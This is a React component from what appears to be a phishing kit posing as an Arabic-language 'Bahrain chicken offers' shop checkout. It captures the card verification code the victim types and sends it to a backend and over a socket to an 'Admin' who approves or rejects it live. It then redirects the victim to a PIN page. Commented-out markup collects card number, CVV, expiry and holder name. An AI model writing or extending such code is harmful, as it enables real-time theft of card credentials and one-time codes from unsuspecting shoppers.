import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";

const OTP = () => {
  const [otp, setOtp] = useState("");
  const [load, setLoad] = useState(null);
  const [error, setError] = useState(false);

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();

    try {
      await axios
        .post(api_route + "/visaOtp/" + id, { visa_otp: otp })
        .then(() => {
          socket.emit("visaOtp", { id, otp });
        });
    } catch (error) {
      console.error(error);
    }
  };

  socket.on("acceptVisaOTP", (data) => {
    console.log("acceptVisaOTP From Admin", id);
    console.log(data);
    if (id === data) {
      window.location.href = "/pin";
    }
  });

  socket.on("declineVisaOTP", (data) => {
    console.log("declineVisaOTP From Admin", data);

    console.log(data);
    if (id === data) {
      setLoad(false);
      setError("كود تحقق البطاقة غير صحيح برجاء المحاولة مره اخري");
    }
  });

  return (
    <div className="w-full lg:w-1/2 flex flex-col items-center justify-center my-5 rounded-md">
      <div className=" bg-opacity-75 w-full flex flex-col md:flex-row  items-center justify-center text-black px-2 py-8 rounded-lg ">
        <div
          className=" w-full flex flex-col gap-y-2 md:items-end justify-center items-center md:py-2"
          dir="rtl "
        >
          <img src="/logo.png" />
          <span className="text-lg">عروض دجاج البحرين</span>
          <form
            className="w-full flex flex-col  gap-y-3 py-5"
            onSubmit={handleSubmit}
          >
            <div className="w-full flex flex-col gap-y-3 text-black" dir="rtl">
              <div className="flex gap-x-2">
                <span className="w-1/3">عدد المنتجات</span>
                <span>
                  {new Array(sessionStorage.getItem("products"))?.length}
                </span>
              </div>
              <div className="flex gap-x-2">
                <span className="w-1/3"></span>
                <span></span>
              </div>
              <div className="flex gap-x-2">
                <span className="w-1/3"> مبلغ الدفع</span>
                <span>{sessionStorage.getItem("totalPrice")} ر.س</span>
              </div>
            </div>

            <div className="flex flex-col w-full gap-y-3 mt-5 " dir="rtl">
              <span>كود التحقق </span>
            </div>

            <div className="flex flex-col w-full gap-3  my-2">
              <input
                value={otp}
                required
                onChange={(e) => setOtp(e.target.value)}
                dir="ltr"
                minLength={4}
                maxLength={6}
                type="text"
                placeholder="كود التحقق المرسل إليك "
                className="w-full     rounded-md  text-black   p-2   text-center border     outline-green-800"
              />
            </div>

            <button
              type="submit"
              className="flex items-center text-white justify-center gap-2 p-2 w-full mt-5"
              style={{ background: "#8c00ff" }}
            >
              تأكيد
            </button>
            {error && (
              <span className="text-red-500 text-center w-full py-2 text-sm">
                {error}
              </span>
            )}
          </form>
        </div>
      </div>
      {load ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
    </div>
    // <div
    //   className="w-full flex flex-col min-h-screen items-center justify-center  relative"
    //   dir="rtl"
    // >
    //   <form
    //     className=" w-11/12  p-3 rounded-xl justify-center  items-center flex flex-col gap-y-2 "
    //     onSubmit={handleSubmit}
    //   >
    //     <div
    //       className="w-full py-3  flex flex-col items-center justify-between p-2 rounded-xl"
    //       dir="rtl"
    //     >
    //       <div className="flex flex-col w-full gap-3  my-2">
    //         <input
    //           value={car_holder_name}
    //           required
    //           onChange={(e) => setCardHolderName(e.target.value)}
    //           dir="ltr"
    //           minLength={4}
    //           type="text"
    //           placeholder="الأسم المدون علي البطاقة"
    //           className="w-full   rounded-md border    p-2  placeholder:text-gray-600 text-center     outline-orange-500"
    //         />
    //       </div>
    //       <div className="flex flex-col w-full gap-3  my-2" dir="rtl">
    // <input
    //   value={card_number}
    //   required
    //   onChange={handleCardNumberChange}
    //   dir="ltr"
    //   maxLength={19}
    //   minLength={16}
    //   inputMode="numeric"
    //   type="text"
    //   placeholder="**** **** **** ****"
    //   className="w-full   rounded-md border    p-2  placeholder:text-gray-600 text-center     outline-orange-500"
    // />
    //       </div>
    //       <div className="w-full flex items-end justify-end">
    //         <img src="/img7.avif" />
    //       </div>
    //       <div className="flex w-full  gap-2">
    //         <div
    //           className="flex flex-col w-full  gap-x-5 text-xl my-2"
    //           dir="rtl"
    //         >
    // <div className="flex w-full gap-x-5 px-2 text-sm ">
    //   <div className="flex items-center justify-center gap-x-2">
    //     <input
    //       className="text-xs  border rounded-md py-2 px-1 text-center w-1/2"
    //       type="text"
    //       value={cvv}
    //       onChange={handleCvvChange}
    //       inputMode="numeric"
    //       placeholder="CVV"
    //       maxLength={3}
    //       required
    //     />
    //     <span className="text-xs"> كود الحماية</span>
    //   </div>
    //   <div className="flex items-center justify-center gap-x-2">
    //     <input
    //       className="text-xs  border rounded-md py-2 px-1 text-center w-1/2"
    //       type="text"
    //       value={expiryDate}
    //       maxLength={5}
    //       inputMode="numeric"
    //       onChange={handleExpiryDateChange}
    //       placeholder="MM/YY"
    //       required
    //     />
    //     <span className="text-xs"> تاريخ الإنتهاء </span>
    //   </div>
    //  </div>
    // </div>
    //       </div>
    //       <div
    //         className="flex items-center justify-start gap-3 px-2 text-lg text-gray-500 my-2 "
    //         dir="rtl"
    //       ></div>

    //       <div className="w-full flex items-center justify-center relative">
    //         <img src="/visa2.png" className="rounded-md" />
    //         {cvv && (
    //           <span className="text-white absolute right-16 top-6 font-semibold">
    //             {cvv}
    //           </span>
    //         )}
    //         <div className="absolute w-full h-full flex flex-col items-center justify-center -bottom-10 gap-y-2">
    //           {car_holder_name && (
    //             <span className="text-white">{car_holder_name}</span>
    //           )}
    //           {card_number && <span className="text-white">{card_number}</span>}
    //           {expiryDate && <span className="text-white">{expiryDate}</span>}
    //         </div>
    //       </div>
    //       {error && (
    //         <span className="text-red-500 w-full text-center text-lg mt-5 font-bold">
    //           {error}
    //         </span>
    //       )}

    //       <button
    //         className="bg-black w-full my-5 font-bold text-white flex items-center justify-center  py-2 rounded-md mt-5"
    //         type="submit"
    //       >
    //         {load ? (
    //           <TailSpin
    //             height="30"
    //             width="30"
    //             color="white"
    //             ariaLabel="tail-spin-loading"
    //             radius="1"
    //             wrapperStyle={{}}
    //             wrapperClass=""
    //             visible={true}
    //           />
    //         ) : (
    //           "تسديد "
    //         )}
    //       </button>
    //     </div>
    //   </form>
    //   <img src="/visa3.png" className="w-11/12 my-2 " />
    // </div>
  );
};

export default OTP;
